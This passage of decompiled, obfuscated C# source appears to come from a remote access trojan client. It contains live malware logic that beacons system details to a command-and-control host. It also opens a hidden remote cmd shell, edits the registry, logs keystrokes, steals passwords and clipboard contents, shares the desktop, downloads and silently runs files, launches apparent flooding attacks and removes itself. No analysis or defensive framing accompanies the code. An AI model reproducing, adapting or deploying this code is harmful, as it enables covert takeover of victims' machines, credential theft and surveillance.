						Process processById = Process.GetProcessById(Conversions.ToInteger(text));
						ShowWindow(processById.MainWindowHandle, 4);
					}
					catch (Exception projectError2)
					{
						ProjectData.SetProjectError(projectError2);
						ProjectData.ClearProjectError();
					}
					break;
				default:
					QSWSDxTR122(1);
					try
					{
						streamWriter_2.WriteLine("/REFRWIND/");
						streamWriter_2.Flush();
					}
					catch (Exception projectError)
					{
						ProjectData.SetProjectError(projectError);
						ProjectData.ClearProjectError();
					}
					break;
				}
			}
		}
		catch (Exception projectError10)
		{
			ProjectData.SetProjectError(projectError10);
			ProjectData.ClearProjectError();
		}
	}

	private void wzdZB209()
	{
		string text = null;
		try
		{
			while (auDL0tRoGKYp148.Connected)
			{
				text = X2MfMjzjhFYp151.ReadLine();
				if (Operators.CompareString(text, (string)null, false) == 0)
				{
					QSWSDxTR122(1);
				}
				switch (Strings.Left(text, 10))
				{
				case "/REGYVIEW/":
					try
					{
						switch (Strings.Mid(text, 11, Strings.Len(text)))
						{
						case "CU":
						{
							Thread thread6 = new Thread(GVLcW165);
							thread6.Start("CU");
							break;
						}
						case "LM":
						{
							Thread thread6 = new Thread(GVLcW165);
							thread6.Start("LM");
							break;
						}
						case "US":
						{
							Thread thread6 = new Thread(GVLcW165);
							thread6.Start("US");
							break;
						}
						}
					}
					catch (Exception projectError7)
					{
						ProjectData.SetProjectError(projectError7);
						ProjectData.ClearProjectError();
					}
					break;
				case "/REGVIEWS/":
					try
					{
						string text13 = null;
						string text14 = null;
						text = Strings.Mid(text, 11, Strings.Len(text));
						string[] array5 = null;
						array5 = text.Split(new char[1] { '¥' });
						text14 = array5[0];
						text13 = array5[1];
						switch (text14)
						{
						case "CU":
						{
							Thread thread5 = new Thread(ooMfi166);
							thread5.Start(text14 + text13);
							break;
						}
						case "LM":
						{
							Thread thread5 = new Thread(ooMfi166);
							thread5.Start(text14 + text13);
							break;
						}
						case "US":
						{
							Thread thread5 = new Thread(ooMfi166);
							thread5.Start(text14 + text13);
							break;
						}
						}
					}
					catch (Exception projectError6)
					{
						ProjectData.SetProjectError(projectError6);
						ProjectData.ClearProjectError();
					}
					break;
				case "/REGVIEWV/":
					try
					{
						string text11 = null;
						string text12 = null;
						text = Strings.Mid(text, 11, Strings.Len(text));
						string[] array4 = null;
						array4 = text.Split(new char[1] { '¥' });
						text12 = array4[0];
						text11 = array4[1];
						switch (text12)
						{
						case "CU":
						{
							Thread thread4 = new Thread(VIPK7170);
							thread4.Start(text12 + text11);
							break;
						}
						case "LM":
						{
							Thread thread4 = new Thread(VIPK7170);
							thread4.Start(text12 + text11);
							break;
						}
						case "US":
						{
							Thread thread4 = new Thread(VIPK7170);
							thread4.Start(text12 + text11);
							break;
						}
						}
					}
					catch (Exception projectError5)
					{
						ProjectData.SetProjectError(projectError5);
						ProjectData.ClearProjectError();
					}
					break;
				case "/REGCREAT/":
					try
					{
						string text8 = null;
						string text9 = null;
						text = Strings.Mid(text, 11, Strings.Len(text));
						string[] array3 = null;
						array3 = text.Split(new char[1] { '¥' });
						text9 = array3[0];
						text8 = array3[1];
						string text10 = array3[2];
						switch (text9)
						{
						case "CU":
						{
							Thread thread3 = new Thread(jymvp167);
							thread3.Start(text9 + text8 + "§" + text10);
							break;
						}
						case "LM":
						{
							Thread thread3 = new Thread(jymvp167);
							thread3.Start(text9 + text8 + "§" + text10);
							break;
						}
						case "US":
						{
							Thread thread3 = new Thread(jymvp167);
							thread3.Start(text9 + text8 + "§" + text10);
							break;
						}
						}
					}
					catch (Exception projectError4)
					{
						ProjectData.SetProjectError(projectError4);
						ProjectData.ClearProjectError();
					}
					break;
				case "/REGDELET/":
					try
					{
						string text5 = null;
						string text6 = null;
						text = Strings.Mid(text, 11, Strings.Len(text));
						string[] array2 = null;
						array2 = text.Split(new char[1] { '¥' });
						text6 = array2[0];
						text5 = array2[1];
						string text7 = array2[2];
						switch (text6)
						{
						case "CU":
						{
							Thread thread2 = new Thread(Ub2Ry168);
							thread2.Start(text6 + text5 + "§" + text7);
							break;
						}
						case "LM":
						{
							Thread thread2 = new Thread(Ub2Ry168);
							thread2.Start(text6 + text5 + "§" + text7);
							break;
						}
						case "US":
						{
							Thread thread2 = new Thread(Ub2Ry168);
							thread2.Start(text6 + text5 + "§" + text7);
							break;
						}
						}
					}
					catch (Exception projectError3)
					{
						ProjectData.SetProjectError(projectError3);
						ProjectData.ClearProjectError();
					}
					break;
				case "/REGRENAM/":
					try
					{
						string text2 = null;
						string text3 = null;
						text = Strings.Mid(text, 11, Strings.Len(text));
						string[] array = null;
						array = text.Split(new char[1] { '¥' });
						text3 = array[0];
						text2 = array[1];
						string text4 = array[2];
						switch (text3)
						{
						case "CU":
						{
							Thread thread = new Thread(qJaNZ169);
							thread.Start(text3 + text2 + "§" + text4);
							break;
						}
						case "LM":
						{
							Thread thread = new Thread(qJaNZ169);
							thread.Start(text3 + text2 + "§" + text4);
							break;
						}
						case "US":
						{
							Thread thread = new Thread(qJaNZ169);
							thread.Start(text3 + text2 + "§" + text4);
							break;
						}
						}
					}
					catch (Exception projectError2)
					{
						ProjectData.SetProjectError(projectError2);
						ProjectData.ClearProjectError();
					}
					break;
				default:
					QSWSDxTR122(1);
					try
					{
						xYY9wY2Smq6O150.WriteLine("/REGYVIEW/");
						xYY9wY2Smq6O150.Flush();
					}
					catch (Exception projectError)
					{
						ProjectData.SetProjectError(projectError);
						ProjectData.ClearProjectError();
					}
					break;
				}
			}
		}
		catch (Exception projectError8)
		{
			ProjectData.SetProjectError(projectError8);
			ProjectData.ClearProjectError();
		}
	}

	private void method_16()
	{
		string text = null;
		try
		{
			while (uISHH62sXdzV153.Connected)
			{
				text = rRBaDvsH9hdw156.ReadLine();
				if (Operators.CompareString(text, (string)null, false) == 0)
				{
					QSWSDxTR122(1);
				}
				switch (Strings.Left(text, 10))
				{
				case "/STARTCMD/":
					try
					{
						if (!FGTMZeXg144("cmd"))
						{
							process_0 = new Process();
							process_0.StartInfo.FileName = "cmd.exe";
							process_0.StartInfo.CreateNoWindow = true;
							process_0.StartInfo.UseShellExecute = false;
							process_0.StartInfo.RedirectStandardOutput = true;
							process_0.StartInfo.RedirectStandardInput = true;
							process_0.StartInfo.RedirectStandardError = true;
							process_0.OutputDataReceived += process_0_OutputDataReceived;
							process_0.Start();
							process_0.BeginOutputReadLine();
						}
					}
					catch (Exception projectError3)
					{
						ProjectData.SetProjectError(projectError3);
						ProjectData.ClearProjectError();
					}
					break;
				case "/STOPCMD/":
					try
					{
						Process[] processes = Process.GetProcesses();
						foreach (Process process in processes)
						{
							if (process.ProcessName.StartsWith("cmd"))
							{
								process.Kill();
							}
						}
					}
					catch (Exception projectError2)
					{
						ProjectData.SetProjectError(projectError2);
						ProjectData.ClearProjectError();
					}
					break;
				case "/CMDCMDGO/":
					try
					{
						text = Strings.Mid(text, 11, Strings.Len(text));
						YrmJt33.Append(text);
						YrmJt33.Append("\r\n");
						process_0.StandardInput.WriteLine((object?)YrmJt33);
						YrmJt33.Remove(0, YrmJt33.Length);
					}
					catch (Exception projectError)
					{
						ProjectData.SetProjectError(projectError);
						ProjectData.ClearProjectError();
					}
					break;
				}
			}
		}
		catch (Exception projectError4)
		{
			ProjectData.SetProjectError(projectError4);
			ProjectData.ClearProjectError();
		}
	}

	private void method_17()
	{
		checked
		{
			while (true)
			{
				rzP3M15 = 0;
				YrmJt33 = new StringBuilder();
				opAkC28 = new TcpClient();
				int delayInSeconds = method_6(5, 25);
				QSWSDxTR122(delayInSeconds);
				string text = null;
				string text2 = null;
				try
				{
					if (KmsWp191(string_1))
					{
						text = string_1;
					}
					else
					{
						IPAddress[] hostAddresses = Dns.GetHostAddresses(string_1);
						if (hostAddresses.Length > 1)
						{
							text = hostAddresses[0].ToString();
							try
							{
								if (!KmsWp191(text))
								{
									text = hostAddresses[1].ToString();
								}
							}
							catch (Exception projectError)
							{
								ProjectData.SetProjectError(projectError);
								text = hostAddresses[0].ToString();
								ProjectData.ClearProjectError();
							}
						}
						else
						{
							text = hostAddresses[0].ToString();
						}
					}
				}
				catch (Exception projectError2)
				{
					ProjectData.SetProjectError(projectError2);
					ProjectData.ClearProjectError();
				}
				try
				{
					if (KmsWp191(Tq2IC24))
					{
						text2 = Tq2IC24;
					}
					else
					{
						IPAddress[] hostAddresses = Dns.GetHostAddresses(Tq2IC24);
						if (hostAddresses.Length > 1)
						{
							text2 = hostAddresses[0].ToString();
							try
							{
								if (!KmsWp191(text2))
								{
									text2 = hostAddresses[1].ToString();
								}
							}
							catch (Exception projectError3)
							{
								ProjectData.SetProjectError(projectError3);
								text2 = hostAddresses[0].ToString();
								ProjectData.ClearProjectError();
							}
						}
						else
						{
							text2 = hostAddresses[0].ToString();
						}
					}
				}
				catch (Exception projectError4)
				{
					ProjectData.SetProjectError(projectError4);
					ProjectData.ClearProjectError();
				}
				try
				{
					opAkC28.Connect(text, pG95I26);
					tBwfK29 = opAkC28.GetStream();
					EoA3n31 = new StreamReader(tBwfK29);
					Yomi430 = new StreamWriter(tBwfK29);
					rzP3M15 = 0;
					KTbCfb13Wf9J177 = text;
					NhtzEOTBVDgc178 = pG95I26;
				}
				catch (Exception projectError5)
				{
					ProjectData.SetProjectError(projectError5);
					try
					{
						try
						{
							opAkC28.Connect(text, int_1);
							tBwfK29 = opAkC28.GetStream();
							EoA3n31 = new StreamReader(tBwfK29);
							Yomi430 = new StreamWriter(tBwfK29);
							rzP3M15 = 0;
							KTbCfb13Wf9J177 = text;
							NhtzEOTBVDgc178 = int_1;
						}
						catch (Exception projectError6)
						{
							ProjectData.SetProjectError(projectError6);
							try
							{
								opAkC28.Connect(text2, pG95I26);
								tBwfK29 = opAkC28.GetStream();
								EoA3n31 = new StreamReader(tBwfK29);
								Yomi430 = new StreamWriter(tBwfK29);
								rzP3M15 = 0;
								KTbCfb13Wf9J177 = text2;
								NhtzEOTBVDgc178 = pG95I26;
							}
							catch (Exception projectError7)
							{
								ProjectData.SetProjectError(projectError7);
								try
								{
									opAkC28.Connect(text2, int_1);
									tBwfK29 = opAkC28.GetStream();
									EoA3n31 = new StreamReader(tBwfK29);
									Yomi430 = new StreamWriter(tBwfK29);
									rzP3M15 = 0;
									KTbCfb13Wf9J177 = text2;
									NhtzEOTBVDgc178 = int_1;
								}
								catch (Exception projectError8)
								{
									ProjectData.SetProjectError(projectError8);
									vRddgi94130();
									Thread.Sleep(100);
									ProjectData.ClearProjectError();
									continue;
								}
								ProjectData.ClearProjectError();
							}
							ProjectData.ClearProjectError();
						}
					}
					catch (Exception projectError9)
					{
						ProjectData.SetProjectError(projectError9);
						Thread.Sleep(100);
						ProjectData.ClearProjectError();
						continue;
					}
					ProjectData.ClearProjectError();
				}
				QSWSDxTR122(1);
				try
				{
					string text3 = "Client" + Conversions.ToString(method_6(1, 99999));
					try
					{
						if (Operators.ConditionalCompareObjectEqual(((ServerComputer)ACXI0nnlHiqmG3Ru0QxC52.Computer).get_Registry().get_CurrentUser().OpenSubKey("Software\\Microsoft", writable: false)!.GetValue("Client"), (object)null, false))
						{
							((ServerComputer)ACXI0nnlHiqmG3Ru0QxC52.Computer).get_Registry().get_CurrentUser().OpenSubKey("Software\\Microsoft", writable: true)!.SetValue("Client", text3, RegistryValueKind.String);
						}
						else
						{
							text3 = Conversions.ToString(((ServerComputer)ACXI0nnlHiqmG3Ru0QxC52.Computer).get_Registry().get_CurrentUser().OpenSubKey("Software\\Microsoft", writable: false)!.GetValue("Client"));
						}
					}
					catch (Exception projectError10)
					{
						ProjectData.SetProjectError(projectError10);
						ProjectData.ClearProjectError();
					}
					if ((Operators.CompareString(text3, (string)null, false) == 0) | (text3.Length < 2))
					{
						text3 = "Client" + Conversions.ToString(method_6(1, 99999));
					}
					StreamWriter yomi = Yomi430;
					string[] array = new string[12]
					{
						"/TRYFIRST/",
						text3,
						"*",
						((ServerComputer)ACXI0nnlHiqmG3Ru0QxC52.Computer).get_Name(),
						"*",
						Environment.UserName,
						"*",
						((ServerComputer)ACXI0nnlHiqmG3Ru0QxC52.Computer).get_Info().get_OSFullName(),
						"*3.6*",
						null,
						null,
						null
					};
					string[] array2 = array;
					string lpszName = "";
					string lpszVer = "";
					array2[9] = Conversions.ToString(capGetDriverDescriptionA(0, ref lpszName, 0, ref lpszVer, 0));
					array[10] = "*";
					array[11] = CCWP0RW8104();
					yomi.WriteLine(string.Concat(array));
					Yomi430.Flush();
				}
				catch (Exception projectError11)
				{
					ProjectData.SetProjectError(projectError11);
					ProjectData.ClearProjectError();
				}
				while (opAkC28.Connected)
				{
					try
					{
						string text4 = EoA3n31.ReadLine();
						switch (Strings.Left(text4, 10))
						{
						case "/TRYTRYDK/":
							p9Coj68 = new TcpClient();
							p9Coj68.Connect(KTbCfb13Wf9J177, NhtzEOTBVDgc178);
							networkStream_0 = p9Coj68.GetStream();
							streamReader_0 = new StreamReader(networkStream_0);
							streamWriter_0 = new StreamWriter(networkStream_0);
							UG76J72 = new Thread(PTNUI192);
							UG76J72.Start();
							streamWriter_0.WriteLine("/TRYDESKK/");
							streamWriter_0.Flush();
							continue;
						case "/TRYTRYWB/":
							maQSv73 = new TcpClient();
							maQSv73.Connect(KTbCfb13Wf9J177, NhtzEOTBVDgc178);
							pZsAg74 = maQSv73.GetStream();
							xyGqM76 = new StreamReader(pZsAg74);
							fy7N275 = new StreamWriter(pZsAg74);
							KzgFk77 = new Thread(t4j7k193);
							KzgFk77.Start();
							fy7N275.WriteLine("/TRYWEBBB/");
							fy7N275.Flush();
							continue;
						case "/TRYTRYFM/":
							ZJhW978 = new TcpClient();
							ZJhW978.Connect(KTbCfb13Wf9J177, NhtzEOTBVDgc178);
							J2wEW79 = ZJhW978.GetStream();
							streamReader_1 = new StreamReader(J2wEW79);
							Y1nh980 = new StreamWriter(J2wEW79);
							xJgZX82 = new Thread(PCQAh194);
							xJgZX82.Start();
							Y1nh980.WriteLine("/TRYFMMMM/");
							Y1nh980.Flush();
							continue;
						case "/TRYTRYIN/":
							lZGjY83 = new TcpClient();
							lZGjY83.Connect(KTbCfb13Wf9J177, NhtzEOTBVDgc178);
							NTbxv84 = lZGjY83.GetStream();
							d1sQ486 = new StreamReader(NTbxv84);
							FHvqx85 = new StreamWriter(NTbxv84);
							wbogF87 = new Thread(YUAIr196);
							wbogF87.Start();
							FHvqx85.WriteLine("/TRYINFOO/");
							FHvqx85.Flush();
							continue;
						case "/TRYTRYMS/":
							BJ1JM88 = new TcpClient();
							BJ1JM88.Connect(KTbCfb13Wf9J177, NhtzEOTBVDgc178);
							fthZO89 = BJ1JM88.GetStream();
							streamReader_2 = new StreamReader(fthZO89);
							JlcG990 = new StreamWriter(fthZO89);
							pEpIJ92 = new Thread(qmplC197);
							pEpIJ92.Start();
							JlcG990.WriteLine("/TRYMSGGG/");
							JlcG990.Flush();
							continue;
						case "/TRYTRYFN/":
							wgqVq93 = new TcpClient();
							wgqVq93.Connect(KTbCfb13Wf9J177, NhtzEOTBVDgc178);
							networkStream_1 = wgqVq93.GetStream();
							cqvBN96 = new StreamReader(networkStream_1);
							streamWriter_1 = new StreamWriter(networkStream_1);
							RPMHZ97 = new Thread(method_13);
							RPMHZ97.Start();
							streamWriter_1.WriteLine("/TRYFUNNN/");
							streamWriter_1.Flush();
							continue;
						case "/TRYTRYIE/":
							GmCMf98 = new TcpClient();
							GmCMf98.Connect(KTbCfb13Wf9J177, NhtzEOTBVDgc178);
							Xki0g99 = GmCMf98.GetStream();
							streamReader_3 = new StreamReader(Xki0g99);
							Z3myE100 = new StreamWriter(Xki0g99);
							cn4wi102 = new Thread(mWLCl199);
							cn4wi102.Start();
							Z3myE100.WriteLine("/TRYIEEEE/");
							Z3myE100.Flush();
							continue;
						case "/TRYTRYCL/":
							Z8NUR103 = new TcpClient();
							Z8NUR103.Connect(KTbCfb13Wf9J177, NhtzEOTBVDgc178);
							GtIWJ104 = Z8NUR103.GetStream();
							Izrug106 = new StreamReader(GtIWJ104);
							NXDop105 = new StreamWriter(GtIWJ104);
							thread_0 = new Thread(OHOBt200);
							thread_0.Start();
							NXDop105.WriteLine("/TRYCLIPP/");
							NXDop105.Flush();
							continue;
						case "/TRYTRYRD/":
							VgtCN108 = new TcpClient();
							VgtCN108.Connect(KTbCfb13Wf9J177, NhtzEOTBVDgc178);
							jh6tf109 = VgtCN108.GetStream();
							wkqPR111 = new StreamReader(jh6tf109);
							Pxo8z110 = new StreamWriter(jh6tf109);
							bi9Tn112 = new Thread(nMwPH201);
							bi9Tn112.Start();
							Pxo8z110.WriteLine("/TRYRDDDD/");
							Pxo8z110.Flush();
							continue;
						case "/TRYTRYPM/":
							CVAg9113 = new TcpClient();
							CVAg9113.Connect(KTbCfb13Wf9J177, NhtzEOTBVDgc178);
							VbQgW114 = CVAg9113.GetStream();
							wR99A116 = new StreamReader(VbQgW114);
							qZ69q115 = new StreamWriter(VbQgW114);
							abjUK117 = new Thread(method_14);
							abjUK117.Start();
							qZ69q115.WriteLine("/TRYPMMMM/");
							qZ69q115.Flush();
							continue;
						case "/TRYTRYSF/":
							OD75s118 = new TcpClient();
							OD75s118.Connect(KTbCfb13Wf9J177, NhtzEOTBVDgc178);
							C6Aea119 = OD75s118.GetStream();
							DH7b9121 = new StreamReader(C6Aea119);
							nHQkj120 = new StreamWriter(C6Aea119);
							wehok122 = new Thread(Vi4ti203);
							wehok122.Start();
							nHQkj120.WriteLine("/TRYSFFFF/");
							nHQkj120.Flush();
							continue;
						case "/TRYTRYLG/":
							k90ic123 = new TcpClient();
							k90ic123.Connect(KTbCfb13Wf9J177, NhtzEOTBVDgc178);
							rCGvk124 = k90ic123.GetStream();
							OPXt37KdAmJK126 = new StreamReader(rCGvk124);
							i4KNkjpRY3P0125 = new StreamWriter(rCGvk124);
							thread_1 = new Thread(method_15);
							thread_1.Start();
							i4KNkjpRY3P0125.WriteLine("/TRYKEYYY/");
							i4KNkjpRY3P0125.Flush();
							continue;
						case "/TRYTRYPS/":
							XkRQ7milvkkb128 = new TcpClient();
							XkRQ7milvkkb128.Connect(KTbCfb13Wf9J177, NhtzEOTBVDgc178);
							lJnuViKWlZFR129 = XkRQ7milvkkb128.GetStream();
							gU6d3neO8VWj131 = new StreamReader(lJnuViKWlZFR129);
							c7OghOFOOovJ130 = new StreamWriter(lJnuViKWlZFR129);
							kh52f4dXFZDZ132 = new Thread(rdq4U205);
							kh52f4dXFZDZ132.Start();
							c7OghOFOOovJ130.WriteLine("/TRYPASSS/");
							c7OghOFOOovJ130.Flush();
							continue;
						case "/TRYTRYPR/":
							x23HEvnWdEd0133 = new TcpClient();
							x23HEvnWdEd0133.Connect(KTbCfb13Wf9J177, NhtzEOTBVDgc178);
							bxTXKQIhbvV0134 = x23HEvnWdEd0133.GetStream();
							kxaDy06G34RI136 = new StreamReader(bxTXKQIhbvV0134);
							IDzJby4gh6F1135 = new StreamWriter(bxTXKQIhbvV0134);
							bfcOhlO272Z1137 = new Thread(jS9iW206);
							bfcOhlO272Z1137.Start();
							IDzJby4gh6F1135.WriteLine("/TRYPROCC/");
							IDzJby4gh6F1135.Flush();
							continue;
						case "/TRYTRYSE/":
							WDKFAWJ4RRDd138 = new TcpClient();
							WDKFAWJ4RRDd138.Connect(KTbCfb13Wf9J177, NhtzEOTBVDgc178);
							G5JapfWDLRyW139 = WDKFAWJ4RRDd138.GetStream();
							fq56lMQjCZ8c141 = new StreamReader(G5JapfWDLRyW139);
							lfZViCUhx8HU140 = new StreamWriter(G5JapfWDLRyW139);
							CDCR5mf45Njl142 = new Thread(h6Ye3207);
							CDCR5mf45Njl142.Start();
							lfZViCUhx8HU140.WriteLine("/TRYSERVV/");
							lfZViCUhx8HU140.Flush();
							continue;
						case "/TRYTRYOW/":
							XNMeXlFxnPVY143 = new TcpClient();
							XNMeXlFxnPVY143.Connect(KTbCfb13Wf9J177, NhtzEOTBVDgc178);
							networkStream_2 = XNMeXlFxnPVY143.GetStream();
							streamReader_4 = new StreamReader(networkStream_2);
							streamWriter_2 = new StreamWriter(networkStream_2);
							thread_2 = new Thread(DPzEv208);
							thread_2.Start();
							streamWriter_2.WriteLine("/TRYOWWWW/");
							streamWriter_2.Flush();
							continue;
						case "/TRYTRYRG/":
							auDL0tRoGKYp148 = new TcpClient();
							auDL0tRoGKYp148.Connect(KTbCfb13Wf9J177, NhtzEOTBVDgc178);
							S32wYwVljV7D149 = auDL0tRoGKYp148.GetStream();
							X2MfMjzjhFYp151 = new StreamReader(S32wYwVljV7D149);
							xYY9wY2Smq6O150 = new StreamWriter(S32wYwVljV7D149);
							VIcXcTBen0d2152 = new Thread(wzdZB209);
							VIcXcTBen0d2152.Start();
							xYY9wY2Smq6O150.WriteLine("/TRYREGGG/");
							xYY9wY2Smq6O150.Flush();
							continue;
						case "/TRYTRYCM/":
							uISHH62sXdzV153 = new TcpClient();
							uISHH62sXdzV153.Connect(KTbCfb13Wf9J177, NhtzEOTBVDgc178);
							JFyZlNmSZydO154 = uISHH62sXdzV153.GetStream();
							rRBaDvsH9hdw156 = new StreamReader(JFyZlNmSZydO154);
							M5FtORrWPKL4155 = new StreamWriter(JFyZlNmSZydO154);
							kCSzEl2Vv4VC157 = new Thread(method_16);
							kCSzEl2Vv4VC157.Start();
							M5FtORrWPKL4155.WriteLine("/TRYCMDDD/");
							M5FtORrWPKL4155.Flush();
							continue;
						case "/REMOVESV/":
							try
							{
								string text9 = Conversions.ToString(((ServerComputer)ACXI0nnlHiqmG3Ru0QxC52.Computer).get_Registry().get_CurrentUser().OpenSubKey(iTVVmbDQ113(DzuU1A6v16.xVskll3c41(), "12345#$%"), writable: false)!.GetValue(iTVVmbDQ113(DzuU1A6v16.smethod_0(), "12345#$%")));
								((ServerComputer)ACXI0nnlHiqmG3Ru0QxC52.Computer).get_FileSystem().DeleteFile(text9);
							}
							catch (Exception projectError27)
							{
								ProjectData.SetProjectError(projectError27);
								ProjectData.ClearProjectError();
							}
							try
							{
								((ServerComputer)ACXI0nnlHiqmG3Ru0QxC52.Computer).get_Registry().get_CurrentUser().OpenSubKey(iTVVmbDQ113(DzuU1A6v16.xVskll3c41(), "12345#$%"), writable: true)!.DeleteValue(iTVVmbDQ113(DzuU1A6v16.smethod_0(), "12345#$%"));
							}
							catch (Exception projectError28)
							{
								ProjectData.SetProjectError(projectError28);
								ProjectData.ClearProjectError();
							}
							try
							{
								string text10 = Conversions.ToString(((ServerComputer)ACXI0nnlHiqmG3Ru0QxC52.Computer).get_Registry().get_CurrentUser().OpenSubKey(iTVVmbDQ113(DzuU1A6v16.xVskll3c41(), "12345#$%"), writable: false)!.GetValue(iTVVmbDQ113(DzuU1A6v16.smethod_1(), "12345#$%")));
								((ServerComputer)ACXI0nnlHiqmG3Ru0QxC52.Computer).get_FileSystem().DeleteFile(text10);
							}
							catch (Exception projectError29)
							{
								ProjectData.SetProjectError(projectError29);
								ProjectData.ClearProjectError();
							}
							try
							{
								((ServerComputer)ACXI0nnlHiqmG3Ru0QxC52.Computer).get_Registry().get_CurrentUser().OpenSubKey(iTVVmbDQ113(DzuU1A6v16.xVskll3c41(), "12345#$%"), writable: true)!.DeleteValue(iTVVmbDQ113(DzuU1A6v16.smethod_1(), "12345#$%"));
							}
							catch (Exception projectError30)
							{
								ProjectData.SetProjectError(projectError30);
								ProjectData.ClearProjectError();
							}
							try
							{
								string executablePath = Application.get_ExecutablePath();
								string text11 = Environment.GetFolderPath(Environment.SpecialFolder.ApplicationData) + "\\Microsoft";
								_ = text11 + "\\" + Path.GetFileName(executablePath);
								foreach (string file in ((ServerComputer)ACXI0nnlHiqmG3Ru0QxC52.Computer).get_FileSystem().GetFiles(text11))
								{
									try
									{
										if (((ServerComputer)ACXI0nnlHiqmG3Ru0QxC52.Computer).get_FileSystem().GetFileInfo(file).Length > 100000L)
										{
											((ServerComputer)ACXI0nnlHiqmG3Ru0QxC52.Computer).get_FileSystem().DeleteFile(file);
										}
									}
									catch (Exception projectError31)
									{
										ProjectData.SetProjectError(projectError31);
										ProjectData.ClearProjectError();
									}
								}
							}
							catch (Exception projectError32)
							{
								ProjectData.SetProjectError(projectError32);
								ProjectData.ClearProjectError();
							}
							try
							{
								Environment.Exit(0);
							}
							catch (Exception projectError33)
							{
								ProjectData.SetProjectError(projectError33);
								Environment.Exit(0);
								ProjectData.ClearProjectError();
							}
							continue;
						case "/DLARUNVS/":
							try
							{
								List<string> list2 = new List<string>();
								string[] array6 = Strings.Mid(text4, 11, Strings.Len(text4)).Split(new char[1] { '/' });
								string[] array7 = array6;
								foreach (string item2 in array7)
								{
									list2.Add(item2);
								}
								int index2 = list2.Count - 1;
								string text7 = Strings.Mid(text4, 11, Strings.Len(text4));
								string[] array8 = list2[index2].ToString().Split(new char[1] { '.' });
								string text8 = null;
								text8 = ((!((Operators.CompareString(array8[array8.Length - 1], "swf", false) == 0) | (Operators.CompareString(array8[array8.Length - 1], "SWF", false) == 0))) ? array8[array8.Length - 1] : "exe");
								((ServerComputer)ACXI0nnlHiqmG3Ru0QxC52.Computer).get_Network().DownloadFile(text7, Environment.GetEnvironmentVariable("Temp") + "\\" + array8[0] + "." + text8, (string)null, (string)null, false, 100000, true);
								QSWSDxTR122(1);
								Process.Start(Environment.GetEnvironmentVariable("Temp") + "\\" + array8[0] + "." + text8);
							}
							catch (Exception projectError26)
							{
								ProjectData.SetProjectError(projectError26);
								ProjectData.ClearProjectError();
							}
							continue;
						case "/DLARUNHD/":
							try
							{
								List<string> list = new List<string>();
								string[] array3 = Strings.Mid(text4, 11, Strings.Len(text4)).Split(new char[1] { '/' });
								string[] array4 = array3;
								foreach (string item in array4)
								{
									list.Add(item);
								}
								int index = list.Count - 1;
								string text5 = Strings.Mid(text4, 11, Strings.Len(text4));
								string[] array5 = list[index].ToString().Split(new char[1] { '.' });
								string text6 = null;
								text6 = ((!((Operators.CompareString(array5[array5.Length - 1], "swf", false) == 0) | (Operators.CompareString(array5[array5.Length - 1], "SWF", false) == 0))) ? array5[array5.Length - 1] : "exe");
								((ServerComputer)ACXI0nnlHiqmG3Ru0QxC52.Computer).get_Network().DownloadFile(text5, Environment.GetEnvironmentVariable("Temp") + "\\" + array5[0] + "." + text6, (string)null, (string)null, false, 100000, true);
								QSWSDxTR122(1);
								Process process = new Process();
								process.StartInfo.WindowStyle = ProcessWindowStyle.Hidden;
								process.StartInfo.FileName = Environment.GetEnvironmentVariable("Temp") + "\\" + array5[0] + "." + text6;
								process.Start();
							}
							catch (Exception projectError25)
							{
								ProjectData.SetProjectError(projectError25);
								ProjectData.ClearProjectError();
							}
							continue;
						case "/RESTWIND/":
							try
							{
								Interaction.Shell("shutdown -r /t 0", (AppWinStyle)2, false, -1);
							}
							catch (Exception projectError24)
							{
								ProjectData.SetProjectError(projectError24);
								ProjectData.ClearProjectError();
							}
							continue;
						case "/TURNWIND/":
							try
							{
								Interaction.Shell("shutdown -s /t 0", (AppWinStyle)2, false, -1);
							}
							catch (Exception projectError23)
							{
								ProjectData.SetProjectError(projectError23);
								ProjectData.ClearProjectError();
							}
							continue;
						case "/LOGOWIND/":
							try
							{
								Interaction.Shell("shutdown -l /t 0", (AppWinStyle)2, false, -1);
							}
							catch (Exception projectError22)
							{
								ProjectData.SetProjectError(projectError22);
								ProjectData.ClearProjectError();
							}
							continue;
						case "/MEUPDATE/":
							continue;
						case "/BACKUPUP/":
							continue;
						case "/INSTALLK/":
							try
							{
								text4 = Strings.Mid(text4, 11, Strings.Len(text4));
								Thread thread7 = new Thread(FqOlL181);
								thread7.Start(text4);
							}
							catch (Exception projectError21)
							{
								ProjectData.SetProjectError(projectError21);
								ProjectData.ClearProjectError();
							}
							continue;
						case "/UPANDRUN/":
							try
							{
								text4 = Strings.Mid(text4, 11, Strings.Len(text4));
								Thread thread6 = new Thread(method_8);
								thread6.Start(text4);
							}
							catch (Exception projectError20)
							{
								ProjectData.SetProjectError(projectError20);
								ProjectData.ClearProjectError();
							}
							continue;
						case "/DDATONWB/":
							try
							{
								text4 = Strings.Mid(text4, 11, Strings.Len(text4));
								Thread thread5 = new Thread(TDRUo155);
								thread5.Start(text4);
							}
							catch (Exception projectError19)
							{
								ProjectData.SetProjectError(projectError19);
								ProjectData.ClearProjectError();
							}
							continue;
						case "/PASSALLL/":
							try
							{
								Thread thread4 = new Thread(bkbXM156);
								thread4.Start();
							}
							catch (Exception projectError18)
							{
								ProjectData.SetProjectError(projectError18);
								ProjectData.ClearProjectError();
							}
							continue;
						case "/OPENWEBB/":
							try
							{
								text4 = Strings.Mid(text4, 11, Strings.Len(text4));
								Thread thread3 = new Thread(CgWsw157);
								thread3.Start(text4);
							}
							catch (Exception projectError17)
							{
								ProjectData.SetProjectError(projectError17);
								ProjectData.ClearProjectError();
							}
							continue;
						case "/DDATONWS/":
							try
							{
								Thread thread2 = new Thread(yeIia158);
								thread2.Start();
							}
							catch (Exception projectError16)
							{
								ProjectData.SetProjectError(projectError16);
								ProjectData.ClearProjectError();
							}
							continue;
						case "/AVAILABL/":
							try
							{
								text4 = Strings.Mid(text4, 11, Strings.Len(text4));
								Thread thread = new Thread(yvf5F159);
								thread.Start(text4);
							}
							catch (Exception projectError15)
							{
								ProjectData.SetProjectError(projectError15);
								ProjectData.ClearProjectError();
							}
							continue;
						case "/RETURNSX/":
							try
							{
								text4 = Strings.Mid(text4, 11, Strings.Len(text4));
								try
								{
									try
									{
										if (Conversions.ToBoolean(Operators.NotObject(Operators.CompareObjectEqual(((ServerComputer)ACXI0nnlHiqmG3Ru0QxC52.Computer).get_Registry().get_CurrentUser().OpenSubKey("Software\\Microsoft", writable: false)!.GetValue("Client"), (object)text4, false))))
										{
